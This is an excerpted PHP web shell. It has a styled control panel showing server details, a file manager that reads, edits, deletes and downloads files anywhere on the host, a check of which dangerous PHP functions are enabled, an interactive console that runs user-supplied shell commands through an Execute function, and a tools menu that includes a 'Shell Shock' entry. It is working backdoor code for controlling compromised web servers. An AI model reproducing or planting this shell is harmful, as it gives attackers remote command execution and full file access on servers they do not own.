...
<html>
<head>
	<title><?=sprintf('%s - %s', $config['title'], $config['version'])?></title>
	...
	<style type="text/css">
		...
		*,html{margin:0;padding:0;line-height:1rem}
		...
		#info{margin:23px 0 0;padding:0 13px 0 0}
		#logo{border-top:1px solid #111;border-bottom:1px solid #111;padding:15px 0 25px 0;margin:0 0 23px 0}
		...
		#title{text-align:center;font-size:44px;margin:0}
		...
		#console{min-height:100px;padding:10px;border-radius:5px}
		#console-input{border:none}
		#curdir-console{min-width:10px}
	...
	window.onload=function(){
		/* Cursor Focus */
		if(document.getElementById("console-input") !== null) document.getElementById("console-input").focus();
	...
	function getAjax(txt,id,method,url){
		var xmlhttp;
		if(txt){
			document.getElementById(id).innerHTML="Please Wait... <div class='loading'></div>";
		}else{
	...
	function ajaxAbort(txt,id){
		if(txt){
			...
			document.getElementById(id).value="Canceled";
		}
		xhr.abort();
	}
	function checkAll(){
...
printf("<div id='header'>
		<div class='header-left'>
			<div id='info'>
				...
				[PHP SAPI]: <font class='on'>%s</font><br>
				[SAFE MODE]: %s<br>
			</div>
		</div>
		...
		server_name, gethostbyname(http_host), server_port, 
		...
		php_sapi_name(), GetSafeMode(), $config['title'], $config['version'],
...
if(any("d", $_REQUEST)||request_uri==script_name)
{
	...
	if($handle=@opendir($dir))
	{
		...
		while(false !==($file=readdir($handle)))
		{
			...
			if($file==".")
			{
				$reads[]="<tr sorttable_customkey='2'><td><center><input type='checkbox' name='nochk[]' value='".urle($dir)."'/></center></td><td><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='/> <a href='?d=".urle($dir)."'>.</a></td><td><center>".$type."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=x&r=".urle($dir)."' onclick=\"return confirm('Delete It ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($dir)."' title='Modify Folder'>&#8499;</a></td></tr>";
			}
			elseif($file=="..")
			{
				$reads[]="<tr sorttable_customkey='1'><td><center><input type='checkbox' name='nochk[]' value='".urle($updir)."'/></center></td><td><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='/> <a href='?d=".urle($updir)."'>".$file."</a></td><td><center>".$type."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=x&r=".urle($updir)."' onclick=\"return confirm('Delete It ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($updir)."' title='Modify Folder'>&#8499;</a></td></tr>";
			}
			else
			{
				if($type=="Dir")
				{
					$reads[]="<tr sorttable_customkey='3'><td><center><input type='checkbox' name='chk[]' value='".urle($filedir)."' /></center></td><td><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='/> <a class='flink' title='Explore Directory' href='?d=".urle($filedir)."'>".$file."</a></td><td><center>".$type."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=x&r=".urle($filedir)."' onclick=\"return confirm('Delete It ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($filedir)."' title='Modify Folder'>&#8499;</a></td></tr>";
					$count_dirs++;
				}
				else
				{
					$reads[]="<tr sorttable_customkey='4'><td><center><input type='checkbox' name='chk[]' value='".urle($filedir)."' /></center></td><td><img src='data:image/png;base64,'> <a class='flink' title='Edit File' href='?a=v&r=".urle($filedir)."'>".$file."</a></td><td><center>".$type."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=e&r=".urle($filedir)."' title='Modify File'>&#8499;</a> <a class='action' href='?a=x&r=".urle($filedir)."' onclick=\"return confirm('Delete It ?');\" title='Delete File'>&#10008;</a> <a class='action' href='?a=d&r=".urle($filedir)."' title='Download File'>&#10149;</a></td></tr>";		
					$count_files++;
				}
			}
		}
...
if(any("r", $_REQUEST))
{
	...
	if($_REQUEST['a']=='v')
	{
		...
		if(is_readable($file))
		{
			if(any("w", $_REQUEST))
			{
				$fix_path=str_replace(_, '/', $file);
				
				if(strpos($fix_path, document_root)  !== false)
				{
					$protocol=empty($_SERVER['HTTPS']) || $_SERVER['HTTPS'] === 'off'?'http://':'https://';
					$path=str_replace(document_root, '', $fix_path);
					$url=$protocol.server_name.$path;
				}
				else
				{
					$url=$fix_path;
				...
				if($_REQUEST['w']=='i')
				{
					printf("<center><img src='%s' alt='No Image'/></center>", $url);
				}
...
if(any("x", $_REQUEST))
{
	...
	if($_REQUEST['x']=="secure")
	{
		...
		foreach($fucks as $fuck) 
		{
			...
			{
				$enable++;
				$table.="<font color=white>READY</font>";
			}
			$table.="</td></tr>";
			$no++;
		}
	...
	if($_REQUEST['x']=="console")
	{
		...
		printf("
			<div id='console'>
				<textarea id='prompt-console' class='cmd' cols='122' rows='20' readonly>%s</textarea>
				<form onsubmit='return false;'>
					<label id='curdir-console'>$ %s:</label>
					<input type='text' id='console-input' autocomplete='off' onfocus=\"\" onkeydown=\"
						if(event.keyCode==13) 
						{
							temp=this.value; 
							this.value='';
							getAjax(true, 'curdir-console','POST','?x=console&xa=consoles-curdir&cmd='+temp);
							return getAjax(false, 'prompt-console','POST','?x=console&xa=consoles&cmd='+temp);
						}
					\" class='cmd' name=cmd cols=122 rows=2></input>
				</form>
			</div>", Execute('whoami'), $dir);

		if(any("xa", $_REQUEST)&&$_REQUEST['xa']=="consoles")
		{	
			ob_clean();
			$dir=any("curdir", $_SESSION)?$_SESSION['curdir']:getcwd();
		...
		elseif(any("xa", $_REQUEST)&&$_REQUEST['xa']=="consoles-curdir")
		{	
			ob_clean();
			$dir=any("curdir", $_SESSION)?$_SESSION['curdir']:getcwd();
			$command=!empty($_REQUEST['cmd'])?$_REQUEST['cmd']:"whoami";
	...
	if($_REQUEST['x']=="action")
	{
		...
		if(any('action-button', $_REQUEST))
		{
			...
			printf("<h4>Dir's: [%s] File's: [%s]</h4>
					...
					</form>", $count_dirs, $count_files, $row, $value, $dir._);
			...
			if(any('xa', $_REQUEST)&&$_REQUEST['xa']=='option')
			{
				if($_REQUEST['action-option']=='copy')
				{
					...
					print_r($_REQUEST['newloc']);
					
					/*foreach($files as $file)
					{
						echo $_REQUEST['newloc']._.basename($file).'ss';
						copy($file, $_REQUEST['newloc']._.basename($file).'ss');
						echo $_REQUEST['newloc']._.basename($file).'ss';
					}*/
				}
...
if(any("z", $_REQUEST))
{
	...
	echo MenuTools([
		...
		"shell-shock"=>["title"=>"Shell Shock","ver"=>"1.0","auth"=>"-"],
	]);
			...
			<form onsubmit='return false;' class='new'>
				...
				<div class='hash-capture'>
					<div class='hash-capture-left'>
						<label>String</label><textarea id='hashtext' placeholder='...'></textarea>
						<input type='submit' onclick=\"
							document.getElementById('hashtext').value='';
						\" value='Clear'/>
					</div>
					<div class='hash-capture-right'>
						<label>Result</label><textarea id='hashresult' placeholder='...'></textarea>
						<input type='submit' onclick=\"
